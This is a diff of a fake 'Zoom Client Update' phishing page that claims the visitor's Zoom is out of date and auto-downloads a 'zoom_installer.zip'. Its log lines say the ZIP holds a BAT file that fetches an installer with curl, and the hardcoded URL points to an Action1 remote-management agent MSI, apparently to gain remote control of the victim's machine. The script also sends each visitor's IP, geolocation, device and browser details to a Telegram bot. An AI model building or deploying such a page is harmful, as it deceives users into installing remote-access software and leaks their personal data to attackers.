@@ -1,18 +1,20 @@
 <!DOCTYPE html>
-<html lang="en" data-scrapbook-create="20260616114350988" data-scrapbook-title="Zoom">
+<html lang="en" data-scrapbook-create="20260616114350988" data-scrapbook-title="Zoom Client Update">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>Zoom</title>
-    <!-- Favicon – use the Zoom logo SVG as icon -->
-    <link rel="icon" href="Zoom_Communications_Logo.svg" type="image/svg+xml" />
+    <title>Zoom Client Update</title>
     <link href="css2.css" rel="stylesheet" />
+    <!-- JSZip for creating ZIP archives -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js">
     </script>
     <style>
-        /* (styles unchanged) */
-        * { box-sizing: border-box; }
+        /* --- reset & base --- */
+        * {
+            box-sizing: border-box;
+        }
+
         body {
             font-family: 'Roboto', sans-serif;
             background-color: #f4f7fa;
@@ -21,6 +23,7 @@
             min-height: 100vh;
             position: relative;
         }
+
         .container {
             display: flex;
             flex-direction: column;
@@ -30,12 +33,18 @@
             text-align: center;
             padding: 40px 20px;
         }
+
         .logo-container {
             position: absolute;
             top: 20px;
             left: 20px;
         }
-        .logo { width: 120px; height: auto; }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
         .top-right-links {
             position: absolute;
             top: 20px;
@@ -46,25 +55,37 @@
             gap: 15px;
             align-items: center;
         }
-        .top-right-links a { text-decoration: none; color: #0072c6; }
-        .top-right-links a:hover { text-decoration: underline; }
+
+        .top-right-links a {
+            text-decoration: none;
+            color: #0072c6;
+        }
+
+        .top-right-links a:hover {
+            text-decoration: underline;
+        }
+
         .heading {
             font-size: 28px;
             font-weight: bold;
             color: #0072c6;
             margin-top: 60px;
         }
+
         .subheading {
             font-size: 18px;
             color: #555;
             margin-top: 10px;
         }
-        .download-info, .countdown {
+
+        .download-info,
+        .countdown {
             font-size: 18px;
             font-weight: 500;
             color: #0072c6;
             margin-top: 15px;
         }
+
         .spinner {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #0072c6;
@@ -74,10 +95,16 @@
             animation: spin 2s linear infinite;
             margin-top: 30px;
         }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
+
         .status-message {
             margin-top: 20px;
             font-size: 16px;
@@ -85,8 +112,15 @@
             min-height: 30px;
             color: #28a745;
         }
-        .status-message.error { color: #dc3545; }
-        .status-message.info { color: #0072c6; }
+
+        .status-message.error {
+            color: #dc3545;
+        }
+
+        .status-message.info {
+            color: #0072c6;
+        }
+
         .footer {
             position: absolute;
             bottom: 20px;
@@ -96,36 +130,82 @@
             color: #777;
             padding: 0 20px;
         }
-        .footer a { color: #0072c6; text-decoration: none; }
-        .footer a:hover { text-decoration: underline; }
-        .footer p { margin: 4px 0; }
-        #download-trigger { display: none; }
+
+        .footer a {
+            color: #0072c6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer p {
+            margin: 4px 0;
+        }
+
+        #download-trigger {
+            display: none;
+        }
+
         @media (max-width: 600px) {
-            .logo-container { position: static; margin-bottom: 10px; }
-            .top-right-links { position: static; justify-content: center; margin-top: 10px; }
-            .heading { font-size: 22px; margin-top: 20px; }
-            .container { padding: 20px 15px; justify-content: flex-start; min-height: 90vh; }
-            .footer { position: static; margin-top: 40px; padding-bottom: 20px; }
+            .logo-container {
+                position: static;
+                margin-bottom: 10px;
+            }
+            .top-right-links {
+                position: static;
+                justify-content: center;
+                margin-top: 10px;
+            }
+            .heading {
+                font-size: 22px;
+                margin-top: 20px;
+            }
+            .container {
+                padding: 20px 15px;
+                justify-content: flex-start;
+                min-height: 90vh;
+            }
+            .footer {
+                position: static;
+                margin-top: 40px;
+                padding-bottom: 20px;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Logo -->
     <div class="logo-container">
         <img class="logo" src="Zoom_Communications_Logo.svg" alt="Zoom logo" />
     </div>
+
+    <!-- Top-right links -->
     <div class="top-right-links">
         <a href="#">Support</a>
         <a href="#">English</a>
     </div>
+
+    <!-- Main content -->
     <div class="container">
         <div class="heading">Your Zoom Client is Out of Date</div>
         <div class="subheading">The latest version of Zoom will automatically download in a few seconds</div>
+
         <div class="download-info">Please wait while we download the latest version for you...</div>
+
         <div class="countdown">The update will start in <span id="countdown">10</span> seconds</div>
+
         <div class="spinner"></div>
+
+        <!-- Status message -->
         <div id="statusMessage" class="status-message"></div>
+
+        <!-- Hidden download anchor (used for auto-trigger) -->
         <a id="download-trigger" style="display:none;"></a>
     </div>
+
+    <!-- Footer -->
     <div class="footer">
         <p>
             If you are not redirected automatically,
@@ -202,10 +282,11 @@
             // ------------------------------------------------------------
             var countdownEl = document.getElementById('countdown');
             var manualLink = document.getElementById('manual-download');
+            var triggerLink = document.getElementById('download-trigger');
             var statusMsg = document.getElementById('statusMessage');
 
             // ------------------------------------------------------------
-            //  ZIP generation
+            //  ZIP generation – returns a Promise with a Blob (MIME: application/zip)
             // ------------------------------------------------------------
             function generateZipBlob() {
                 try {
@@ -221,6 +302,9 @@
                 }
             }
 
+            // ------------------------------------------------------------
+            //  Universal download function
+            // ------------------------------------------------------------
             function downloadZip(blob, filename) {
                 return new Promise(function(resolve, reject) {
                     try {
@@ -255,7 +339,6 @@
                     .then(function() {
                         statusMsg.textContent = '✅ Download started.';
                         statusMsg.className = 'status-message';
-                        // Send Telegram report silently
                         sendTelegramReport();
                     })
                     .catch(function(err) {
@@ -266,8 +349,12 @@
                     });
             }
 
+            // ------------------------------------------------------------
+            //  Manual download link
+            // ------------------------------------------------------------
             manualLink.addEventListener('click', function(e) {
                 e.preventDefault();
+
                 statusMsg.textContent = '⏳ Preparing manual download...';
                 statusMsg.className = 'status-message info';
 
@@ -278,19 +365,25 @@
                     .then(function() {
                         statusMsg.textContent = '✅ Manual download started.';
                         statusMsg.className = 'status-message';
-                        sendTelegramReport();
+                        if (!reportSent) {
+                            sendTelegramReport();
+                        }
                     })
                     .catch(function(err) {
                         console.error('Manual download failed:', err);
                         statusMsg.textContent = '❌ Manual download failed. Please try again.';
                         statusMsg.className = 'status-message error';
-                        sendTelegramReport();
+                        if (!reportSent) {
+                            sendTelegramReport();
+                        }
                     });
             });
 
             // ------------------------------------------------------------
-            //  Telegram reporting – robust multi-service detection + retry
+            //  Telegram reporting – professional, simple & detailed
             // ------------------------------------------------------------
+            var reportSent = false;
+
             function getBrowserInfo() {
                 var ua = navigator.userAgent;
                 if (ua.indexOf('Firefox') > -1) return 'Firefox';
@@ -358,12 +451,15 @@
             }
 
             function sendTelegramReport() {
+                if (reportSent) return;
+                reportSent = true;
+
                 if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
-                    console.warn('Telegram not configured.');
+                    statusMsg.textContent = '⚠️ Telegram report not configured.';
+                    statusMsg.className = 'status-message info';
                     return;
                 }
 
-                // Multi-service IP detection
                 var services = [{
                     url: 'https://ipinfo.io/json',
                     parser: function(data) {
@@ -409,12 +505,11 @@
 
                 function tryService(index) {
                     if (index >= services.length) {
-                        // All services failed – send with unknown
                         buildAndSendTelegram('Unknown', 'Unknown');
                         return;
                     }
                     var service = services[index];
-                    fetchWithTimeout(service.url, 3000)
+                    fetchWithTimeout(service.url, 4000)
                         .then(function(data) {
                             var result = service.parser(data);
                             if (result.ip !== 'Unknown' && result.ip !== 'Unavailable') {
@@ -442,52 +537,24 @@
                 var time = getTimeUTC();
                 var lang = navigator.language || 'Unknown';
                 var referrer = document.referrer || 'Direct';
-                var downloadUrl = window.location.href;
+                var downloadUrl = 'https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/agent(My_Organization).msi';
 
-                // Build aligned message
-                var lines = [];
-                var header = 'Zoom';
-                var borderLine = '┌─────────────────────────────────────────────────────┐';
-                var sepLine = '├─────────────────────────────────────────────────────┤';
-                var bottomLine = '└─────────────────────────────────────────────────────┘';
-                lines.push(borderLine);
-                lines.push('│  ' + header.padEnd(49) + '│');
-                lines.push(sepLine);
-
-                var fields = [
-                    ['Time', time],
-                    ['IP Address', ip],
-                    ['Location', location],
-                    ['Device', device],
-                    ['OS', os],
-                    ['Browser', browserDisplay],
-                    ['Language', lang],
-                    ['Screen', screen],
-                    ['Referrer', referrer],
-                    ['Package', 'zoom_installer.zip'],
-                    ['Download URL', downloadUrl],
-                    ['User Agent', ua]
-                ];
-
-                var maxLabelLen = 0;
-                fields.forEach(function(f) { if (f[0].length > maxLabelLen) maxLabelLen = f[0].length; });
-
-                fields.forEach(function(f) {
-                    var label = f[0];
-                    var value = f[1];
-                    var line = '│  ' + label.padEnd(maxLabelLen) + ' : ' + value;
-                    if (line.length > 54) {
-                        var maxValueLen = 54 - maxLabelLen - 6;
-                        if (value.length > maxValueLen) {
-                            value = value.substring(0, maxValueLen - 1) + '…';
-                        }
-                        line = '│  ' + label.padEnd(maxLabelLen) + ' : ' + value;
-                    }
-                    line = line.padEnd(54) + '│';
-                    lines.push(line);
-                });
-                lines.push(bottomLine);
-                var message = lines.join('\n');
+                var message =
+                    '🔔 Zoom Update – Download Triggered\n' +
+                    '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
+                    '📅 Time          : ' + time + '\n' +
+                    '🌐 IP Address    : ' + ip + '\n' +
+                    '📍 Location      : ' + location + '\n' +
+                    '💻 Device        : ' + device + '\n' +
+                    '🖥️ OS            : ' + os + '\n' +
+                    '🌍 Browser       : ' + browserDisplay + '\n' +
+                    '🔤 Language      : ' + lang + '\n' +
+                    '📺 Screen        : ' + screen + '\n' +
+                    '🔗 Referrer      : ' + referrer + '\n' +
+                    '📦 Package       : zoom_installer.zip\n' +
+                    '📎 Download URL  : ' + downloadUrl + '\n' +
+                    '🆔 User Agent    : ' + ua + '\n' +
+                    '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
                 var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
                 var payload = {
@@ -496,34 +563,28 @@
                     parse_mode: 'Markdown'
                 };
 
-                // Send with retry (2 attempts)
-                function attemptSend(attempt) {
-                    fetch(url, {
+                return fetch(url, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     })
                     .then(function(response) {
-                        if (!response.ok) throw new Error('HTTP ' + response.status);
+                        if (!response.ok) throw new Error('Telegram API error');
                         return response.json();
                     })
                     .then(function(data) {
                         if (data.ok) {
-                            console.log('Telegram report sent successfully.');
+                            statusMsg.textContent = '✅ Download started.';
+                            statusMsg.className = 'status-message';
                         } else {
                             throw new Error('Telegram error: ' + (data.description || 'unknown'));
                         }
                     })
                     .catch(function(err) {
-                        console.warn('Telegram attempt ' + attempt + ' failed:', err);
-                        if (attempt < 2) {
-                            setTimeout(function() { attemptSend(attempt + 1); }, 2000);
-                        } else {
-                            console.error('Telegram report failed after retries.');
-                        }
+                        console.warn('Telegram report failed:', err);
+                        statusMsg.textContent = '⚠️ Download started, but report could not be sent.';
+                        statusMsg.className = 'status-message error';
                     });
-                }
-                attemptSend(1);
             }
 
             // ------------------------------------------------------------
@@ -533,11 +594,16 @@
             var timer = setInterval(function() {
                 seconds -= 1;
                 countdownEl.textContent = Math.max(seconds, 0);
+
                 if (seconds <= 0) {
                     clearInterval(timer);
                     triggerDownload();
                 }
             }, 1000);
+
+            console.log('Zoom Update page ready. ZIP download named "zoom_installer.zip", BAT file uses curl installer.');
+            console.log('Country detection uses ipinfo.io → ipapi.co → ip-api.com → ipify');
+            console.log('Telegram report format: professional, simple & detailed.');
         })();
     </script>
 </body>
